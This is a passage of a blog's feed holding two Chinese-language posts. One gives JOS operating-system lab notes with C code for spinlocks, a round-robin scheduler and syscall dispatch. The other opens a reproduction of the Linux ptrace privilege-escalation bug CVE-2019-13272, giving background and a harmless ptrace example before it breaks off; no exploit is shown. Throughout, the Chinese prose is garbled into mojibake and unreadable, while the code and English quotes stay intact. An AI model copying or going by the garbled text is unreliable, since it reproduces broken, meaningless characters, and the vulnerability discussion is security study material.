class="line"><span class="type">void</span></span><br><span class="line">__page_free(<span class="keyword">struct</span> PageInfo *pp)</span><br><span class="line">&#123;</span><br><span class="line">    <span class="comment">//...</span></span><br><span class="line"></span><br><span class="line"><span class="type">void</span></span><br><span class="line"><span class="title function_">page_free</span><span class="params">(<span class="keyword">struct</span> PageInfo *pp)</span></span><br><span class="line">&#123;</span><br><span class="line">spin_lock(&amp;page_lock);</span><br><span class="line">res = __page_free(pp);</span><br><span class="line">spin_unlock(&amp;page_lock);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>console driver å…¶å®ä¹Ÿæ˜¯åŒæ ·çš„æ€è·¯ï¼Œä¸è¿‡ç¬”è€…åˆ†ä¸ºè¯»å’Œå†™ä¸¤ä¸ªé”ï¼š</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">spinlock</span> <span class="title">read_lock</span>;</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">spinlock</span> <span class="title">write_lock</span>;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// ...</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// initialize the console devices</span></span><br><span class="line"><span class="type">void</span></span><br><span class="line"><span class="title function_">cons_init</span><span class="params">(<span class="type">void</span>)</span></span><br><span class="line">&#123;</span><br><span class="line">cga_init();</span><br><span class="line">kbd_init();</span><br><span class="line">serial_init();</span><br><span class="line"></span><br><span class="line">__spin_initlock(&amp;read_lock, <span class="string">&quot;console read lock&quot;</span>);</span><br><span class="line">__spin_initlock(&amp;write_lock, <span class="string">&quot;console write lock&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (!serial_exists)</span><br><span class="line">cprintf(<span class="string">&quot;Serial port does not exist!\n&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// `High&#x27;-level console I/O.  Used by readline and cprintf.</span></span><br><span class="line"></span><br><span class="line"><span class="type">void</span></span><br><span class="line"><span class="title function_">cputchar</span><span class="params">(<span class="type">int</span> c)</span></span><br><span class="line">&#123;</span><br><span class="line">spin_lock(&amp;write_lock);</span><br><span class="line">cons_putc(c);</span><br><span class="line">spin_unlock(&amp;write_lock);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span></span><br><span class="line"><span class="title function_">getchar</span><span class="params">(<span class="type">void</span>)</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="type">int</span> c;</span><br><span class="line"></span><br><span class="line">spin_lock(&amp;read_lock);</span><br><span class="line"></span><br><span class="line"><span class="keyword">while</span> ((c = cons_getc()) == <span class="number">0</span>)</span><br><span class="line"><span class="comment">/* do nothing */</span>;</span><br><span class="line"></span><br><span class="line">spin_unlock(&amp;read_lock);</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> c;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><del>scheduler ç°åœ¨è¿˜æ²¡æœ‰å†™å‘¢ï¼Œæ‰€ä»¥ğŸ‘´é€‰æ‹©æ‘¸äº†</del></p><h3 id="Round-Robin-Scheduling"><a href="#Round-Robin-Scheduling" class="headerlink" title="Round-Robin Scheduling"></a>Round-Robin Scheduling</h3><blockquote><p>å…³äºè¿™ä¸ªç®—æ³•ï¼Œç¬”è€…åœ¨<a href="https://arttnba3.cn/2021/09/07/PIECES-0X01-SHELL_OUTSIDE-1-WINDY_SUMMER/#%E5%85%B3%E4%BA%8E%E8%BD%AE%E8%AF%A2%E8%B0%83%E5%BA%A6%E7%AE%97%E6%B3%95%E4%BD%A0%E6%89%80%E4%B8%8D%E7%9F%A5%E9%81%93%E7%9A%84%E4%BA%8C%E4%B8%89%E4%BA%8B">è¿™ç¯‡åšå®¢</a>é‡Œå†™äº†ä»–çš„æ¥é¾™å»è„‰</p></blockquote><p>æ¥ä¸‹æ¥æˆ‘ä»¬éœ€è¦å®ç° <em>è½®è¯¢è°ƒåº¦ç®—æ³•</em> ï¼š</p><ul><li><code>sched_yield()</code> ç”¨ä»¥ä»éå† <code>envs[]</code> æ•°ç»„å¹¶é€‰æ‹©ç¬¬ä¸€ä¸ªçŠ¶æ€ä¸º <code>ENV_RUNNABLE</code> çš„è¿›ç¨‹å»è¿è¡Œ</li><li><code>sched_yield()</code> ä¸åº”å½“è®©ä¸€ä¸ªè¿›ç¨‹è¢«åŒæ—¶è·‘åœ¨ä¸¤ä¸ª CPU ä¸Š</li><li>JOS è¿˜å®ç°äº†ä¸€ä¸ªæ–°çš„ç³»ç»Ÿè°ƒç”¨ <code>sys_yield()</code> ä»¥è®©å½“å‰ç”¨æˆ·è¿›ç¨‹ä¼‘çœ ï¼Œä½¿å½“å‰ CPU å»è¿è¡Œå¦ä¸€ä¸ªè¿›ç¨‹</li></ul><p>æ¥ä¸‹æ¥æ˜¯ Exercise 6 äº†ï¼Œåœ¨ <code>sched_yield()</code>  ä¸­å®ç°è½®è¯¢è°ƒåº¦ç®—æ³•ï¼š</p><blockquote><p><strong>Exercise 6.</strong> Implement round-robin scheduling in <code>sched_yield()</code> as described above. Donâ€™t forget to modify <code>syscall()</code> to dispatch <code>sys_yield()</code>.</p><p>Make sure to invoke <code>sched_yield()</code> in <code>mp_main</code>.</p><p>Modify <code>kern/init.c</code> to create three (or more!) environments that all run the program <code>user/yield.c</code>.</p><p>Run make qemu. You should see the environments switch back and forth between each other five times before terminating, like below.</p><p>Test also with several CPUS: make qemu CPUS&#x3D;2.</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">...</span><br><span class="line">Hello, I am environment 00001000.</span><br><span class="line">Hello, I am environment 00001001.</span><br><span class="line">Hello, I am environment 00001002.</span><br><span class="line">Back in environment 00001000, iteration 0.</span><br><span class="line">Back in environment 00001001, iteration 0.</span><br><span class="line">Back in environment 00001002, iteration 0.</span><br><span class="line">Back in environment 00001000, iteration 1.</span><br><span class="line">Back in environment 00001001, iteration 1.</span><br><span class="line">Back in environment 00001002, iteration 1.</span><br><span class="line">...</span><br></pre></td></tr></table></figure><p>After the <code>yield</code> programs exit, there will be no runnable environment in the system, the scheduler should invoke the JOS kernel monitor. If any of this does not happen, then fix your code before proceeding.</p></blockquote><p>å‰é¢çš„ Challenge è¯´åˆ°ä¸º scheduler åŠ é”ï¼Œå› æ­¤ç¬”è€…é€‰æ‹©åœ¨ <code>kern/env.h</code> ä¸­å£°æ˜ä¸€ä¸ªè‡ªæ—‹é”ï¼Œå®šä¹‰æ”¾åœ¨ <code>kern/env.c</code> ä¸­</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">extern</span> <span class="class"><span class="keyword">struct</span> <span class="title">spinlock</span> <span class="title">sched_lock</span>;</span><span class="comment">// lock for Env in scheduler</span></span><br></pre></td></tr></table></figure><p>åœ¨ <code>env_init()</code> ä¸­å¯¹å…¶åˆå§‹åŒ–</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">void</span></span><br><span class="line"><span class="title function_">env_init</span><span class="params">(<span class="type">void</span>)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="comment">//...</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// initialize the scheduler lock</span></span><br><span class="line">__spin_initlock(&amp;sched_lock, <span class="string">&quot;scheduler lock&quot;</span>);</span><br></pre></td></tr></table></figure><p>æœ€åå°±æ˜¯å®ç° <code>sched_yield()</code> äº†ï¼Œè¿™é‡Œä¸ºäº†ä¿è¯å…¬å¹³å› æ­¤æˆ‘ä»¬åº”å½“ä»å½“å‰è¿›ç¨‹å¾€åè¿›è¡Œéå†è€Œä¸æ˜¯æ¯æ¬¡éƒ½ä» env[0] å¼€å§‹ï¼Œéœ€è¦æ³¨æ„çš„æ˜¯è‹¥æˆ‘ä»¬è½®è¯¢ä¸€éè¿›ç¨‹æ•°ç»„å‘ç°æ²¡æœ‰å…¶ä»–å¯è¿è¡Œè¿›ç¨‹çš„è¯éœ€è¦è¿”å›åˆ°å‘èµ· yield çš„è¿›ç¨‹</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// Choose a user environment to run and run it.</span></span><br><span class="line"><span class="type">void</span></span><br><span class="line"><span class="title function_">sched_yield</span><span class="params">(<span class="type">void</span>)</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">Env</span> *<span class="title">idle</span>;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// Implement simple round-robin scheduling.</span></span><br><span class="line"><span class="comment">//</span></span><br><span class="line"><span class="comment">// Search through &#x27;envs&#x27; for an ENV_RUNNABLE environment in</span></span><br><span class="line"><span class="comment">// circular fashion starting just after the env this CPU was</span></span><br><span class="line"><span class="comment">// last running.  Switch to the first such environment found.</span></span><br><span class="line"><span class="comment">//</span></span><br><span class="line"><span class="comment">// If no envs are runnable, but the environment previously</span></span><br><span class="line"><span class="comment">// running on this CPU is still ENV_RUNNING, it&#x27;s okay to</span></span><br><span class="line"><span class="comment">// choose that environment.</span></span><br><span class="line"><span class="comment">//</span></span><br><span class="line"><span class="comment">// Never choose an environment that&#x27;s currently running on</span></span><br><span class="line"><span class="comment">// another CPU (env_status == ENV_RUNNING). If there are</span></span><br><span class="line"><span class="comment">// no runnable environments, simply drop through to the code</span></span><br><span class="line"><span class="comment">// below to halt the cpu.</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// LAB 4: Your code here.</span></span><br><span class="line"><span class="type">int</span> i, start_idx;</span><br><span class="line"></span><br><span class="line">spin_lock(&amp;sched_lock);</span><br><span class="line"></span><br><span class="line">idle = <span class="literal">NULL</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (curenv)</span><br><span class="line">start_idx = ENVX(curenv-&gt;env_id) + <span class="number">1</span>;</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">start_idx = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">// traversal envs</span></span><br><span class="line"><span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; NENV; i++)</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">if</span> (envs[(start_idx + i) % NENV].env_status == ENV_RUNNABLE)</span><br><span class="line">&#123;</span><br><span class="line">idle = &amp;envs[(start_idx + i) % NENV];</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// no other runnable, try to rerun curenv</span></span><br><span class="line"><span class="keyword">if</span> (!idle &amp;&amp; curenv </span><br><span class="line">&amp;&amp; curenv-&gt;env_status == ENV_RUNNING</span><br><span class="line">&amp;&amp; curenv-&gt;env_cpunum == cpunum())</span><br><span class="line">idle = curenv;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (idle)</span><br><span class="line">&#123;</span><br><span class="line">idle-&gt;env_status = ENV_RUNNING;</span><br><span class="line">spin_unlock(&amp;sched_lock);</span><br><span class="line">env_run(idle);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">spin_unlock(&amp;sched_lock);</span><br><span class="line"><span class="comment">// sched_halt never returns</span></span><br><span class="line">sched_halt();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>è¿™é‡Œæˆ‘ä»¬çš„è‡ªæ—‹é”è¿˜éœ€è¦ä¿æŠ¤æ•´ä¸ª env æ•°ç»„ï¼Œåœ¨ <code>env_alloc()</code> ä¸ <code>env_free()</code> ä¸Šå¥—ä¸€å±‚ wrapperï¼š</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> </span><br><span class="line"><span class="title function_">env_alloc</span><span class="params">(<span class="keyword">struct</span> Env **newenv_store, <span class="type">envid_t</span> parent_id)</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="type">int</span> res;</span><br><span class="line"></span><br><span class="line">spin_lock(&amp;sched_lock);</span><br><span class="line">res = __env_alloc(newenv_store, parent_id);</span><br><span class="line">spin_unlock(&amp;sched_lock);</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> res;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//...</span></span><br><span class="line"></span><br><span class="line"><span class="type">void</span></span><br><span class="line"><span class="title function_">env_free</span><span class="params">(<span class="keyword">struct</span> Env *e)</span></span><br><span class="line">&#123;</span><br><span class="line">spin_lock(&amp;sched_lock);</span><br><span class="line">__env_free(e);</span><br><span class="line">spin_unlock(&amp;sched_lock);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><blockquote><p>è¿™é‡Œç¬”è€…ä¸ºäº†å®ŒæˆåŠ é”çš„é‚£ä¸ª Challengeï¼Œèµ°äº†ä¸å°‘å¼¯è·¯â€¦ä¹Ÿæ‰äº†å‡ æ¬¡å‘â€¦.</p></blockquote><p>åˆ«å¿˜äº†åœ¨ <code>kern/syscall.c</code> ä¸­è¡¥å……ä¸Šå¯¹ <code>sys_yield()</code> çš„è°ƒç”¨ï¼š</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// Dispatches to the correct kernel function, passing the arguments.</span></span><br><span class="line"><span class="type">int32_t</span></span><br><span class="line"><span class="title function_">syscall</span><span class="params">(<span class="type">uint32_t</span> syscallno, <span class="type">uint32_t</span> a1, <span class="type">uint32_t</span> a2, <span class="type">uint32_t</span> a3, <span class="type">uint32_t</span> a4, <span class="type">uint32_t</span> a5)</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="comment">// Call the function corresponding to the &#x27;syscallno&#x27; parameter.</span></span><br><span class="line"><span class="comment">// Return any appropriate return value.</span></span><br><span class="line"><span class="comment">// LAB 3: Your code here.</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// panic(&quot;syscall not implemented&quot;);</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">switch</span> (syscallno) &#123;</span><br><span class="line"><span class="keyword">case</span> SYS_cputs:</span><br><span class="line">sys_cputs((<span class="type">const</span> <span class="type">char</span>*)a1, a2);</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line"><span class="keyword">case</span> SYS_cgetc:</span><br><span class="line"><span class="keyword">return</span> sys_cgetc();</span><br><span class="line"><span class="keyword">case</span> SYS_getenvid:</span><br><span class="line"><span class="keyword">return</span> sys_getenvid();</span><br><span class="line"><span class="keyword">case</span> SYS_env_destroy:</span><br><span class="line"><span class="keyword">return</span> sys_env_destroy(a1);</span><br><span class="line"><span class="keyword">case</span> SYS_yield:</span><br><span class="line">sys_yield();</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line"><span class="keyword">default</span>:</span><br><span class="line"><span class="keyword">return</span> -E_INVAL;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>ä¹‹åæ˜¯ä¹ é¢˜ Timeï¼š</p><blockquote><p><strong>Question</strong></p><ol><li>In your implementation of <code>env_run()</code> you should have called <code>lcr3()</code>. Before and after the call to <code>lcr3()</code>, your code makes references (at least it should) to the variable <code>e</code>, the argument to <code>env_run</code>. Upon loading the <code>%cr3</code> register, the addressing context used by the MMU is instantly changed. But a virtual address (namely <code>e</code>) has meaning relative to a given address contextâ€“the address context specifies the physical address to which the virtual address maps. Why can the pointer <code>e</code> be dereferenced both before and after the addressing switch?</li><li>Whenever the kernel switches from one environment to another, it must ensure the old environmentâ€™s registers are saved so they can be restored properly later. Why? Where does this happen?</li></ol></blockquote><p>ä¸¤ä¸ª Challengeï¼Œ</p><blockquote><p><em>Challenge!</em> Add a less trivial scheduling policy to the kernel, such as a fixed-priority scheduler that allows each environment to be assigned a priority and ensures that higher-priority environments are always chosen in preference to lower-priority environments. If youâ€™re feeling really adventurous, try implementing a Unix-style adjustable-priority scheduler or even a lottery or stride scheduler. (Look up â€œlottery schedulingâ€ and â€œstride schedulingâ€ in Google.)</p><p>Write a test program or two that verifies that your scheduling algorithm is working correctly (i.e., the right environments get run in the right order). It may be easier to write these test programs once you have implemented <code>fork()</code> and IPC in parts B and C of this lab.</p></blockquote><blockquote><p><em>Challenge!</em> The JOS kernel currently does not allow applications to use the x86 processorâ€™s x87 floating-point unit (FPU), MMX instructions, or Streaming SIMD Extensions (SSE). Extend the <code>Env</code> structure to provide a save area for the processorâ€™s floating point state, and extend the context switching code to save and restore this state properly when switching from one environment to another. The <code>FXSAVE</code> and <code>FXRSTOR</code> instructions may be useful, but note that these are not in the old i386 userâ€™s manual because they were introduced in more recent processors. Write a user-level test program that does something cool with floating-point.</p></blockquote>]]></content>
    
    
    <summary type="html">&lt;p&gt;ä¸å¦‚ Windows XP å¥½ç”¨&lt;/p&gt;</summary>
    
    
    
    <category term="EXPERIMENTS" scheme="http://blog.arttnba3.cn/categories/EXPERIMENTS/"/>
    
    
    <category term="æ“ä½œç³»ç»Ÿ" scheme="http://blog.arttnba3.cn/tags/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F/"/>
    
    <category term="å®éªŒç¬”è®°" scheme="http://blog.arttnba3.cn/tags/%E5%AE%9E%E9%AA%8C%E7%AC%94%E8%AE%B0/"/>
    
    <category term="MIT" scheme="http://blog.arttnba3.cn/tags/MIT/"/>
    
    <category term="XV6" scheme="http://blog.arttnba3.cn/tags/XV6/"/>
    
  </entry>
  
  <entry>
    <title>ã€CVE.0x05ã€‘CVE-2019-13272 ptrace æ¼æ´å¤ç°åŠç®€è¦åˆ†æ</title>
    <link href="http://blog.arttnba3.cn/2022/01/17/CVE-0X05-CVE-2019-13272/"/>
    <id>http://blog.arttnba3.cn/2022/01/17/CVE-0X05-CVE-2019-13272/</id>
    <published>2022-01-16T17:49:56.000Z</published>
    <updated>2022-01-16T17:54:33.000Z</updated>
    
    <content type="html"><![CDATA[<p>ä½ ä¸è®¸è¯´ä»–ï¼Œä»–æ˜¯ä½ çˆ¹ï¼Ÿ</p><span id="more"></span><h1 id="0x00-ä¸€åˆ‡å¼€å§‹ä¹‹å‰"><a href="#0x00-ä¸€åˆ‡å¼€å§‹ä¹‹å‰" class="headerlink" title="0x00.ä¸€åˆ‡å¼€å§‹ä¹‹å‰"></a>0x00.ä¸€åˆ‡å¼€å§‹ä¹‹å‰</h1><p>CVE-2019-13272 æ˜¯è‡ª Linux v4.11 ç‰ˆæœ¬èµ·å¼•å…¥çš„ä¸€ä¸ªæœ¬åœ°ææƒæ¼æ´ï¼Œç”±æ¥è‡ª Google Zero Project å®‰å…¨å›¢é˜Ÿçš„  Jann Horn ï¼ˆ<del>å¾ˆå¸…æ°”çš„å¤–å›½å°å“¥</del>ï¼‰äº 2019 å¹´ 9 æœˆå‘ç°ï¼Œè¯¥æ¼æ´çš„æˆå› ä¸»è¦æ˜¯ ptrace ç³»ç»Ÿè°ƒç”¨ä¸­ <code>PTRACE_TRACEME</code> å‚æ•°è°ƒç”¨è·¯å¾„ä¸Šçš„ <code>ptrace_link()</code> å‡½æ•°é”™è¯¯åœ°å¤„ç†äº†æƒ³è¦åˆ›å»º ptrace å…³ç³»çš„è¿›ç¨‹é—´çš„å‡­æ®è®°å½•ï¼Œä»è€Œå¯¼è‡´æ”»å‡»è€…å¯ä»¥é€šè¿‡ suid ç¨‹åºå®ç°æœ¬åœ°ææƒ</p><p>è¯¥æ¼æ´å½±å“ç‰ˆæœ¬ä» <code>v4.11</code> åˆ° <code>v5.1.17</code>ï¼Œä¸è¿‡<strong>åªèƒ½åœ¨æœ‰ç€æ¡Œé¢ç¯å¢ƒçš„æƒ…å†µä¸‹å®Œæˆææƒ</strong>ï¼Œå› ä¸ºææƒéœ€è¦ç”¨åˆ°ä¸€ä¸ªé€šå¸¸åªåœ¨æ¡Œé¢ç¯å¢ƒä¸‹å­˜åœ¨çš„ <em>helperç¨‹åº</em> ï¼Œæ‰€ä»¥ç›¸å¯¹æ¯”è¾ƒé¸¡è‚‹</p><p>åœ¨åˆ†æè¯¥æ¼æ´ä¹‹å‰ï¼Œæˆ‘ä»¬å…ˆè¡¥å……ä¸€äº›å‰ç½®çŸ¥è¯†</p><blockquote><p>ä»¥ä¸‹å†…æ ¸æºç çš†æ¥è‡ªäº Linux v4.11</p></blockquote><h2 id="ptrace-ç³»ç»Ÿè°ƒç”¨"><a href="#ptrace-ç³»ç»Ÿè°ƒç”¨" class="headerlink" title="ptrace ç³»ç»Ÿè°ƒç”¨"></a>ptrace ç³»ç»Ÿè°ƒç”¨</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/ptrace.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">long</span> <span class="title function_">ptrace</span><span class="params">(<span class="keyword">enum</span> __ptrace_request request, <span class="type">pid_t</span> pid,</span></span><br><span class="line"><span class="params">                   <span class="type">void</span> *addr, <span class="type">void</span> *data)</span>;</span><br></pre></td></tr></table></figure><p>ptrace ç³»ç»Ÿè°ƒç”¨ä¸»è¦ç”¨äºå¯¹è¿›ç¨‹è¿›è¡Œè°ƒè¯•ï¼šè¯¥ç³»ç»Ÿè°ƒç”¨æä¾›äº†ä¸€ç§æœºåˆ¶ä½¿å¾—è°ƒè¯•è¿›ç¨‹ï¼ˆptracerï¼‰å¯ä»¥è§‚å¯Ÿä¸æ§åˆ¶è¢«è°ƒè¯•è¿›ç¨‹ï¼ˆptraceeï¼‰çš„æ‰§è¡Œè¿‡ç¨‹ï¼Œå¹¶ä¿®æ”¹è¢«è°ƒè¯•è¿›ç¨‹çš„å¯„å­˜å™¨åŠå†…å­˜ï¼Œä»è€Œæ“æ§è¢«è°ƒè¯•è¿›ç¨‹å®ç°ç‰¹å®šçš„è¡Œä¸º</p><blockquote><p> ç›¸ä¿¡å¤§å®¶å¯¹è¿™ä¸ªç³»ç»Ÿè°ƒç”¨åº”è¯¥éƒ½ä¸é™Œç”Ÿï¼Œgdb è°ƒè¯•ä¾¿æ˜¯åˆ©ç”¨äº†è¿™ä¸ªç³»ç»Ÿè°ƒç”¨</p></blockquote><p>å¸¸è§çš„å»ºç«‹ ptrace è¿æ¥æœ‰ä¸¤ç§æ–¹æ³•ï¼š</p><ul><li>å­è¿›ç¨‹é€šè¿‡ <code>PTRACE_TRACEME</code> è¯·æ±‚çˆ¶è¿›ç¨‹è¿›è¡Œè°ƒè¯•</li><li>çˆ¶è¿›ç¨‹é€šè¿‡ <code>PTRACE_ATTACH</code> ä¸»åŠ¨å¯¹æŒ‡å®šè¿›ç¨‹è¿›è¡Œè°ƒè¯•</li></ul><p>è¿™ä¸ªæ¼æ´ä¸»è¦æ˜¯å‡ºç°åœ¨ç¬¬ä¸€æ¡è·¯å¾„ä¸­ï¼Œå› æ­¤æˆ‘ä»¬ä¸‹æ–‡ä¸»è¦é’ˆå¯¹ç¬¬ä¸€æ¡è·¯å¾„è¿›è¡Œåˆ†æ</p><p>ä¸€ä¸ªå…¸å‹çš„é€šè¿‡ ptrace ç”±çˆ¶è¿›ç¨‹å¯¹å­è¿›ç¨‹è¿›è¡Œå•æ­¥è°ƒè¯•çš„ä¾‹å­å¦‚ä¸‹ï¼š</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;fcntl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/ptrace.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">char</span> **argv, <span class="type">char</span> **envp)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">int</span> wait_val;</span><br><span class="line">    <span class="type">int</span> instructions = <span class="number">0</span>;</span><br><span class="line">    <span class="type">int</span> child_pid = fork();</span><br><span class="line">    <span class="keyword">if</span> (!child_pid) <span class="comment">// child</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">&quot;[*] Set the child as a ptracee.&quot;</span>);</span><br><span class="line">        ptrace(PTRACE_TRACEME, <span class="number">0</span>, <span class="literal">NULL</span>, <span class="literal">NULL</span>); <span class="comment">// let the parent ptrace it, won&#x27;t stop there but send a signal to parent</span></span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">&quot;[+] Done. Now waiting for the parent...&quot;</span>);</span><br><span class="line">        execl(<span class="string">&quot;./helloworld&quot;</span>, <span class="string">&quot;helloworld&quot;</span>, <span class="literal">NULL</span>); <span class="comment">// the programme to be debug</span></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> <span 